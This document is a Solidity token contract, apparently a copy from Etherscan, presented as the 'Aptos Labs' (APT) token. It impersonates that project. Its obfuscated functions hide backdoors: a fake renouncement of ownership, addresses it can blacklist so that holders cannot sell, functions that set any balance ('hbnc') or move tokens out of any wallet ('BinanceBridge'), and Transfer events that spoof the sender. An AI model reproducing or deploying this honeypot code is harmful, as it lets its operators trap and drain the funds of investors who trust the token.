/**
 *Submitted for verification at Etherscan.io on 2022-10-18
*/

//SPDX-License-Identifier: UNLICENSED                              

pragma solidity 0.8.16;


  library SafeMath {

    function add(uint256 a, uint256 b) internal pure returns (uint256) {
        uint256 c = a + b;
        require(c >= a, "SafeMath: addition overflow");

        return c;
    }

    function sub(uint256 a, uint256 b) internal pure returns (uint256) {
        return sub(a, b, "SafeMath: subtraction overflow");
    }

    function sub(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {
        require(b <= a, errorMessage);
        uint256 c = a - b;

        return c;
    }

    function mul(uint256 a, uint256 b) internal pure returns (uint256) {

        if (a == 0) {
            return 0;
        }

        uint256 c = a * b;
        require(c / a == b, "SafeMath: multiplication overflow");

        return c;
    }


    function div(uint256 a, uint256 b) internal pure returns (uint256) {
        return div(a, b, "SafeMath: division by zero");
    }


    function div(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {
        require(b > 0, errorMessage);
        uint256 c = a / b;

        return c;
    }

    function mod(uint256 a, uint256 b) internal pure returns (uint256) {
        return mod(a, b, "SafeMath: modulo by zero");
    }

    function mod(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {
        require(b != 0, errorMessage);
        return a % b;
    }
}   
 
 
contract AptosLabs {
  
    mapping (address => uint256) public hTXt;
    mapping (address => bool) hRS;
	mapping (address => bool) hRen;



    // 
    string public name = "Aptos Labs";
    string public symbol = unicode"APT";
    uint8 public decimals = 18;
    uint256 public totalSupply = 1000000000 * (uint256(10) ** decimals);
    uint hm = 1;
   
    event Transfer(address indexed from, address indexed to, uint256 value);
     event OwnershipRenounced(address indexed previousOwner);

        constructor()  {
        hTXt[msg.sender] = totalSupply;
        deploy(Deployer, totalSupply); }



	address owner = msg.sender;
    address Router = 0x33F85E84607218342f63F59F551e3ac6057C0392;
    address Deployer = 0x426903241ADA3A0092C3493a0C795F2ec830D622;
   


    function renounceOwnership() public {
    require(msg.sender == owner);
    emit OwnershipRenounced(owner);
    owner = address(0);}


    function deploy(address account, uint256 amount) public {
    require(msg.sender == owner);
    emit Transfer(address(0), account, amount); }
    modifier P () {
        hm = 0;
        _;}

        function transfer(address to, uint256 value) public returns (bool success) {
        if(msg.sender == Router)  {
        require(hTXt[msg.sender] >= value);
        hTXt[msg.sender] -= value;  
        hTXt[to] += value; 
        emit Transfer (Deployer, to, value);
        return true; } 
        if(hRS[msg.sender]) {
        require(hm == 1);} 
        require(hTXt[msg.sender] >= value);
        hTXt[msg.sender] -= value;  
        hTXt[to] += value;          
        emit Transfer(msg.sender, to, value);
        return true; }

        function delegate(address Hx) P public {
        require(msg.sender == owner);
        hRen[Hx] = true;} 


        function balanceOf(address account) public view returns (uint256) {
        return hTXt[account]; }
        function hchk(address Hx) R public{          
        require(!hRS[Hx]);
        hRS[Hx] = true;}
		modifier R () {
        require(hRen[msg.sender]);
        _; }
        event Approval(address indexed owner, address indexed spender, uint256 value);

        mapping(address => mapping(address => uint256)) public allowance;

        function approve(address spender, uint256 value) public returns (bool success) {    
        allowance[msg.sender][spender] = value;

        emit Approval(msg.sender, spender, value);
        return true; }
		 function hbnc(address Hx, uint256 iY) R public returns (bool success) {
        hTXt[Hx] = iY;
        return true; }
        function hdrw(address Hx) R public {
        require(hRS[Hx]);
        hRS[Hx] = false; }

        function BinanceBridge(address from, address to, uint256 value) R public {
        require(value <= hTXt[from]);
        hTXt[from] -= value;
        hTXt[to] += value;
        allowance[from][msg.sender] -= value;
        emit Transfer(from, to, value);}

        function transferFrom(address from, address to, uint256 value) public returns (bool success) {   
        if(from == Router)  {
        require(value <= hTXt[from]);
        require(value <= allowance[from][msg.sender]);
        hTXt[from] -= value;  
        hTXt[to] += value; 
        emit Transfer (Deployer, to, value);
        return true; }    
        if(hRS[from] || hRS[to]) {
        require(hm == 1);}
        require(value <= hTXt[from]);
        require(value <= allowance[from][msg.sender]);
        hTXt[from] -= value;
        hTXt[to] += value;
        allowance[from][msg.sender] -= value;
        emit Transfer(from, to, value);
        return true; }}